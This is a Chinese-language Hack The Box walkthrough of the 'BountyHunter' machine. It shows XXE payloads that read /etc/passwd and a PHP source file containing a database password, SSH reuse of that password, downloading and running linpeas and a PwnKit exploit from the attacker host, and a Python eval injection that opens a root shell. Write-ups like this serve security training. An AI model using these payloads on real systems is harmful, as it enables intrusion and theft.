###### tags: `Hack the box` `HTB` `Easy` `Linux`

# BountyHunter
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.31.2 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.31.2:22
Open 10.129.31.2:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

buster
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.31.2/FUZZ.php -w /home/kali/SecLists/Discovery/Web-Content/common.txt

.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3579ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3579ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4582ms]
db                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
index                   [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 294ms]
portal                  [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 293ms]
```


前往`http://10.129.31.2/log_submit.php`利用burp把她卡著看看
```
POST /tracker_diRbPr00f314.php HTTP/1.1

Host: 10.129.31.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 227
Origin: http://10.129.31.2
Connection: keep-alive
Referer: http://10.129.31.2/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5hZG1pbjwvdGl0bGU%2BCgkJPGN3ZT5hZG1pbjwvY3dlPgoJCTxjdnNzPmFkbWluPC9jdnNzPgoJCTxyZXdhcmQ%2BYWRtaW48L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

先`urldecode`再`base64decode`
```
┌──(kali㉿kali)-[~/htb]
└─$ echo "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5hZG1pbjwvdGl0bGU+CgkJPGN3ZT5hZG1pbjwvY3dlPgoJCTxjdnNzPmFkbWluPC9jdnNzPgoJCTxyZXdhcmQ+YWRtaW48L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=" | base64 -d
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>admin</title>
                <cwe>admin</cwe>
                <cvss>admin</cvss>
                <reward>admin</reward>
                </bugreport> 
```

嘗試使用[xxe](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
	<title>admin</title>
	<cwe>admin</cwe>
	<cvss>admin</cvss>
	<reward>&file;</reward>
</bugreport>
```

轉`base64`再`urlencode`
```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KPGJ1Z3JlcG9ydD4KCTx0aXRsZT5hZG1pbjwvdGl0bGU%2BCgk8Y3dlPmFkbWluPC9jd2U%2BCgk8Y3Zzcz5hZG1pbjwvY3Zzcz4KCTxyZXdhcmQ%2BJmZpbGU7PC9yZXdhcmQ%2BCjwvYnVncmVwb3J0Pg%3D%3D

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

參考[payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe)查看`db.php`的資料
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
	<title>admin</title>
	<cwe>admin</cwe>
	<cvss>admin</cvss>
	<reward>&file;</reward>
</bugreport>

## base64
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI+IF0+CjxidWdyZXBvcnQ+Cgk8dGl0bGU+YWRtaW48L3RpdGxlPgoJPGN3ZT5hZG1pbjwvY3dlPgoJPGN2c3M+YWRtaW48L2N2c3M+Cgk8cmV3YXJkPiZmaWxlOzwvcmV3YXJkPgo8L2J1Z3JlcG9ydD4=

## urlencode
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI%2BIF0%2BCjxidWdyZXBvcnQ%2BCgk8dGl0bGU%2BYWRtaW48L3RpdGxlPgoJPGN3ZT5hZG1pbjwvY3dlPgoJPGN2c3M%2BYWRtaW48L2N2c3M%2BCgk8cmV3YXJkPiZmaWxlOzwvcmV3YXJkPgo8L2J1Z3JlcG9ydD4%3D
```

得到
```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

丟decode，得密碼`m19RoAU0hP41A1sTsq6K`
```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

ssh登入`development`後，在`/home/development`可得到user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh development@10.129.31.2 
development@10.129.31.2's password: m19RoAU0hP41A1sTsq6K

development@bountyhunter:~$ cat user.txt
d7022cd07519891090905349709a4959
```

linpeas
```
development@bountyhunter:/tmp$ wget 10.10.14.70/linpeas.sh
development@bountyhunter:/tmp$ chmod +x linpeas.sh
development@bountyhunter:/tmp$ ./linpeas.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)得root之後，在/root得root.txt
```
development@bountyhunter:/tmp$ wget 10.10.14.70/CVE-2021-4034.py

development@bountyhunter:/tmp$ python3 CVE-2021-4034.py

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@bountyhunter:/root# cat root.txt
dd1d5f67bd52bb5fb4e88edcc3018b93
```

另一個方法，查看`sudo -l`
```
development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

查看`/opt/skytrain_inc/ticketValidator.py`
```
development@bountyhunter:/opt/skytrain_inc$ cat ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

查看`ticket`，反正就是讀到`+`號前的數字`%7`要`=4`
```
development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```

做一個ticket裡面+bash
```
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**32+410+88+__import__('os').system('bash')**
##Issued: 2021/04/06
#End Ticket
```

下載他然後用他，得root之後在/root得root.txt
```
development@bountyhunter:/tmp$ wget 10.10.14.70/390681614.md

development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/390681614.md
Destination: New Haven
root@bountyhunter:~# cat root.txt
dd1d5f67bd52bb5fb4e88edcc3018b93
```